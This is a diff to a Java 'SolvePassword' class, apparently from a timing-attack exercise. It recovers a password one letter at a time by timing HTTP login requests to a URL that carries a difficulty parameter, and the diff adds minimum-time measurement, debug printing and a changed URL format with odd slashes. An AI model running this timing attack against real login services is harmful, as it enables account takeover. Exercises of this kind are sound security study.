@@ -46,7 +46,9 @@ public class SolvePassword {
             password.setCharAt(charPosition,smallLetterByFrequency.get(j));
             String url = createUrl(this.baseUrl, this.username, password.toString(), difficulty);
             URLRequest urlRequest = new URLRequest(url);
-            measureEachChar.put(smallLetterByFrequency.get(j),urlRequest.measureConnectionToGivenURLMedian());
+            double time = urlRequest.measureConnectionToGivenURLMinimum();
+            measureEachChar.put(smallLetterByFrequency.get(j),time);
+            System.out.println("letter is " +smallLetterByFrequency.get(j) + "time is: " + time );
         }
         char solvedChar = measureEachChar.entrySet().stream().max((entry1, entry2) -> entry1.getValue() > entry2.getValue() ? 1 : -1).get().getKey();
         System.out.println("letter in place "+ charPosition + " is "+ solvedChar);
@@ -76,7 +78,7 @@ public class SolvePassword {
 
 
     private String createUrl(String baseUrl, String username, String password, Integer difficulty){
-        String url_format = baseUrl + "\\?user=%s\\&password=%s\\&difficulty=%d";
+        String url_format = baseUrl + "?user=%s/&password=%s/&difficulty=%d";
         String url = String.format(url_format,username, password, difficulty);
         return url;
     }
